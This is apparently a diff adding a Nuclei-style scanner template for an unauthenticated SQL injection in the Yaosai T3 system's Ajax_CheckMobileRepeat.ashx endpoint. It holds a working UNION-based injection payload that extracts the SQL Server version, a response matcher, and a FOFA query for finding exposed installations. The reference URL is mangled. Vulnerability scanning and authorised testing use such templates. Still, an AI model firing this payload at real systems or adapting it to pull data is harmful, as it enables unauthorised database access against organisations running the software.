@@ -1,0 +1,29 @@
+id: yaosait3-Ajax_CheckMobileRepeat-sqli
+info:
+  name: 要塞T3系统接口Ajax_CheckMobileRepeat存在SQL注入漏洞
+  author: leadlife
+  severity: high
+  description: 要塞T3系统接口Ajax_CheckMobileRepeat存在SQL注入漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句。
+  reference: 
+    - dehttps://github.com/eeeeeeeeee-code/POC/blob/bef1259d4babbff23c207ae283004ec96ddb1fdb/wpoc/%E8%A6%81%E5%A1%9ET3%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E8%A6%81%E5%A1%9ET3%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3Ajax_CheckMobileRepeat%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.mdmo
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: body="/mlogin.htm?url=" || body="T3/MAIN/Login.aspx"
+    tips:
+    repair:
+    version:
+  tags: yaosai,sqli
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/T3/Ajax/Ajax_CheckMobileRepeat.ashx?action=checkmobilerepeat&mobileNum=1%27%20UNION%20ALL%20SELECT%20NULL%2C%28SELECT%20%40%40version%29--%20aEdt"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body,"Microsoft SQL Server")
+        condition: and
